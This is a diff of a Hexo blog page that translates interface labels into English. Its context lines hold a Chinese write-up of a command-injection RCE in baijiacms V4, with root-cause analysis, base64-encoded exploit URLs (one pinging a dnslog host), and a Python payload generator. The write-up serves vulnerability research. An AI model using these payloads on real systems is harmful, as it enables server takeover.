@@ -76,7 +76,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                             <a class=""
                                href="/"
                             >
-                                首页
+                                HOME
                             </a>
                         </li>
                     
@@ -84,7 +84,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                             <a class=""
                                href="/archives"
                             >
-                                归档
+                                ARCHIVES
                             </a>
                         </li>
                     
@@ -135,12 +135,12 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">首页</a>
+                       href="/">HOME</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">归档</a>
+                       href="/archives">ARCHIVES</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
@@ -224,13 +224,13 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <li>20.04.1-Ubuntu</li>
 </ul>
 <p>漏洞点在文件includes/baijiacms/common.inc.php<br>第654行。</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221120231144576.png" alt="image-20221120231144576"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221120231144576.png" alt="image-20221120231144576"></p>
 <h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>这个system的功能本来是为了执行压缩图片的。所以要利用该漏洞，需要先登录后台，在附近设置中设置图片压缩比例，否则代码无法运行到此处。</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121010931465.png" alt="image-20221121010931465"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121010931465.png" alt="image-20221121010931465"></p>
 <p>EXP1：<a class="link" target="_blank" rel="noopener" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/poc.;echo$%7BIFS%7DcGluZyBwb2MuZXhyNm1xLmNleWUuaW8gLWMgNA==%7Cbase64$%7BIFS%7D-d%7Cbash;&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/poc.;echo${IFS}cGluZyBwb2MuZXhyNm1xLmNleWUuaW8gLWMgNA==|base64${IFS}-d|bash;&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121012250381.png" alt="image-20221121012250381"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121012250381.png" alt="image-20221121012250381"></p>
 <p>EXP2：<a class="link" target="_blank" rel="noopener" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121012638014.png" alt="image-20221121012638014"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121012638014.png" alt="image-20221121012638014"></p>
 <p>其中poc可以使用一下代码生成，随后开启web服务确保可以被访问到即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;cmd&gt;&gt;&gt; &quot;</span>) </span><br><span class="line"></span><br><span class="line">b64cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;echo <span class="subst">&#123;b64cmd&#125;</span>|base64 -d|bash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;name&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">f&quot;<span class="subst">&#123;name&#125;</span>.;<span class="subst">&#123;payload&#125;</span>;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file=webpath+payload,mode=<span class="string">&#x27;w&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -239,10 +239,10 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在该漏洞中，漏洞点为文件includes/baijiacms/common.inc.php<br>第654行的system()。该函数位于file_save()函数中。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;convert&#x27;</span>.<span class="variable">$quality_command</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$file_full_path</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$file_full_path</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121021939492.png" alt="image-20221121021939492"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121021939492.png" alt="image-20221121021939492"></p>
 <p>其中，$quality_command无法控制，能够控制的只有$file_full_path。</p>
 <p>由于上一步调用file_save()的，是fetch_net_file_upload()函数的return部分</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121022039870.png" alt="image-20221121022039870"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121022039870.png" alt="image-20221121022039870"></p>
 <p>$file_full_path的定义往上翻为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_full_path</span> = WEB_ROOT .<span class="variable">$path</span> . <span class="variable">$extpath</span>. <span class="variable">$filename</span>;</span><br><span class="line"><span class="comment"># 后面三个参数定义分别为</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;/attachment/&#x27;</span>;</span><br><span class="line"><span class="variable">$extpath</span>=<span class="string">&quot;<span class="subst">&#123;$extention&#125;</span>/&quot;</span> . date(<span class="string">&#x27;Y/m/&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = random(<span class="number">15</span>) . <span class="string">&quot;.<span class="subst">&#123;$extention&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在$extpath和$filename中出现的$extention的定义为</span></span><br><span class="line"><span class="variable">$extention</span> = pathinfo(<span class="variable">$url</span>,PATHINFO_EXTENSION );</span><br><span class="line"><span class="comment"># 而$url就是可以用户控制的参数，</span></span><br></pre></td></tr></table></figure>
 
@@ -290,46 +290,46 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 </li>
 </ul>
 <h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h2><p>在该系统中，所有的参数都会经过includes/baijiacms.php进行htmlspecialchars过滤</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121021608604.png" alt="image-20221121021608604"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121021608604.png" alt="image-20221121021608604"></p>
 <p>所以payload中首先排除了 &lt; &gt; “ ‘ &amp;这些符号</p>
 <h2 id="pathinfo"><a href="#pathinfo" class="headerlink" title="pathinfo()"></a>pathinfo()</h2><p>pathinfo()会返回文件路径的信息</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121023633375.png" alt="image-20221121023633375"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121023633375.png" alt="image-20221121023633375"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$extention</span> = pathinfo(<span class="variable">$url</span>,PATHINFO_EXTENSION );</span><br></pre></td></tr></table></figure>
 
 <p>代码中传入了PATHINFO_EXTENSION参数，根据官方介绍，传入该参数，只会返回最后一个扩展名，扩展名以  .   划分。结合后面的分析，所以payload只能存在与扩展名中</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121023748242.png" alt="image-20221121023748242"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121023748242.png" alt="image-20221121023748242"></p>
 <h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>这一步有两个条件，首先file_get_contents()需要可以get到文件，其次文件中需要有内容满足file_put_contents()</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_put_contents(<span class="variable">$file_tmp_name</span>, file_get_contents(<span class="variable">$url</span>)) == <span class="literal">false</span>) </span><br></pre></td></tr></table></figure>
 
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221117212518384.png" alt="image-20221117212518384"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221117212518384.png" alt="image-20221117212518384"></p>
 <h2 id="settings-‘image-compress-openscale’"><a href="#settings-‘image-compress-openscale’" class="headerlink" title="$settings[‘image_compress_openscale’]"></a>$settings[‘image_compress_openscale’]</h2><p>最后在file_save()中还有一步</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($settings[&#39;image_compress_openscale&#39;]))</span><br></pre></td></tr></table></figure>
 
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121024152075.png" alt="image-20221121024152075"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121024152075.png" alt="image-20221121024152075"></p>
 <p>这一步在略读了代码后才知道，它由函数globaPriveteSystemSetting()获的，取自数据库中。</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121024947766.png" alt="image-20221121024947766"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121024947766.png" alt="image-20221121024947766"></p>
 <p>略读代码后才知道，这个需要在后台中开启图片上传压缩才会在数据库中建立数据。以便后续读取。</p>
 <p>所以需要在后台的附件设置中开启并设置图片压缩比例（具体数字随意）</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121025117963.png" alt="image-20221121025117963"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121025117963.png" alt="image-20221121025117963"></p>
 <h1 id="具体利用过程解析"><a href="#具体利用过程解析" class="headerlink" title="具体利用过程解析"></a>具体利用过程解析</h1><p>EXP:<a class="link" target="_blank" rel="noopener" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/%5Bwhoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;%5D(http://42.193.178.194/whoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;)&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/[whoami.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;](http://42.193.178.194/whoami.%3Becho%24{IFS}d2hvYW1p|base64%24{IFS}-d|bash%3B)&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
 <p>这端url中，主要起作用的是url参数，其他的只是陪跑的（但是也不能删）。url参数原本是远程图片地址。</p>
 <p>首先在自己的vps上设置payload，这里我设置的命令为whoami，为了便于区分payload，文件名也取名为whoami。然后使用python开启web服务。</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121025858609.png" alt="image-20221121025858609"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121025858609.png" alt="image-20221121025858609"></p>
 <p>然后登录baijiacms后台，设置一个压缩比例，保存，然后访问</p>
 <p><a class="link" target="_blank" rel="noopener" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.%3Becho%24%7BIFS%7Dd2hvYW1p%7Cbase64%24%7BIFS%7D-d%7Cbash%3B&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
 <p>然后我们来看debug。</p>
 <p>代码运行到fetch_net_file_upload函数中，走到$extention = pathinfo($url,PATHINFO_EXTENSION );时，截取到了payload：;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121030454954.png" alt="image-20221121030454954"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121030454954.png" alt="image-20221121030454954"></p>
 <p>随后是mkdir根据时间，后缀，建立文件夹。之后来到if (file_put_contents($file_tmp_name, file_get_contents($url)) == false) 进行判断，这边我为了方便查看file_get_contents和file_put_contents哪个会出问题，多加了两行代码。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag1</span> = file_put_contents(<span class="variable">$file_tmp_name</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="variable">$flag2</span> = file_get_contents(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>
 
 <p>在这里之后进入file_save() 。传入了关键的变量 </p>
 <p>$file_full_path：/www/admin/localhost_80/wwwroot/baijiacmsV4-4.1.4/attachment/;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;/2022/11/G55bRGvfRVr00o3.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121031110033.png" alt="image-20221121031110033"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121031110033.png" alt="image-20221121031110033"></p>
 <p>这边经过几个判断后，最后到达system()，最终传入的命令为。</p>
 <p>convert -quality 100 /www/admin/localhost_80/wwwroot/baijiacmsV4-4.1.4/attachment/;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;/2022/11/AFqEQN31zocEeu1.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash; /www/admin/localhost_80/wwwroot/baijiacmsV4-4.1.4/attachment/;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;/2022/11/AFqEQN31zocEeu1.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;</p>
 <p>由于代码中会根据后缀建立文件夹，所以在system中，payload一共会执行四次，也就是为什么在执行whoami这个payload是，会输出4个www。</p>
-<p><img src="My_Blog\source_posts\baijiacmsV4-RCE\image-20221121031530346.png" alt="image-20221121031530346"></p>
+<p><img src="baijiacmsV4-RCE%5Cimage-20221121031530346.png" alt="image-20221121031530346"></p>
 <h1 id="nothing"><a href="#nothing" class="headerlink" title="nothing"></a>nothing</h1><ol>
 <li><p>在写测试的命令时，如果要用到ping dnslog这类命令，由于linux默认是会一直ping下去的。所以最好加一个-c 4限制次数（系统被搞崩了好多次）</p>
 </li>
@@ -352,7 +352,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                         >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">go免杀笔记</span>
-                                <span class="post-nav-item">下一篇</span>
+                                <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
                               <i class="fas fa-chevron-right"></i>
@@ -368,7 +368,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 <div class="comments-container">
     <div id="comment-anchor"></div>
     <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+        <i class="fas fa-comments">&nbsp;Comments</i>
     </div>
     
 
@@ -465,18 +465,18 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
             <div class="website-count info-item">
                 
                     <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                     </span>
                 
                 
                     <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                     </span>
                 
             </div>
         
         <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
         </div>
         
     </div>
@@ -577,7 +577,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 <input autocomplete="off"
                        autocorrect="off"
                        autocapitalize="off"
-                       placeholder="搜索..."
+                       placeholder="Search..."
                        spellcheck="false"
                        type="search"
                        class="search-input"
